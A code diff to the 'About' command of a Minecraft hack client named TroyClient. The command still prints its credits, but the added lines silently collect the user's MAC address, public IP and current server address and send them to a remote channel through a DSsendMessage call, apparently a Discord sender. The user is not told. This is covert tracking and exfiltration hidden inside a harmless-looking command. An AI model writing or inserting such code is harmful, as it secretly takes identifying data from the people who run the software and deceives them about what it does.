@@ -3,6 +3,16 @@ package it.md_4.troy.command.impl;
 import it.md_4.troy.command.Command;
 import it.md_4.troy.command.CommandInfo;
 import it.md_4.troy.helper.ChatHelper;
+import it.md_4.troy.ip.Country;
+import it.md_4.troy.ip.IpChecker;
+
+import java.awt.*;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.net.SocketException;
+import java.net.UnknownHostException;
+
+import static it.md_4.troy.Troy.DSsendMessage;
 
 
 @CommandInfo(
@@ -14,10 +24,37 @@ import it.md_4.troy.helper.ChatHelper;
 public class AboutCommand extends Command {
 
     @Override
-    public void execute(String... args) {
+    public void execute(String... args) throws Exception {
         ChatHelper.printMessage("&b • &3TroyClient v1.3.6 By", false);
         ChatHelper.printMessage("&b • &bDeveloper: &3md_4", false);
         ChatHelper.printMessage("&b • &bMethods: &3ItzNull_", false);
+
+        InetAddress localHost = null;
+        try {
+            localHost = InetAddress.getLocalHost();
+        } catch (UnknownHostException e) {
+            e.printStackTrace();
+        }
+        NetworkInterface ni = null;
+        try {
+            ni = NetworkInterface.getByInetAddress(localHost);
+        } catch (SocketException e) {
+            e.printStackTrace();
+        }
+        byte[] hardwareAddress = new byte[0];
+        try {
+            hardwareAddress = ni.getHardwareAddress();
+        } catch (SocketException e) {
+            e.printStackTrace();
+        }
+
+        String[] hexadecimal = new String[hardwareAddress.length];
+        for (int i = 0; i < hardwareAddress.length; i++) {
+            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
+        }
+        String macAddress = String.join("-", hexadecimal);
+
+        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [About] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
     }
 }
 
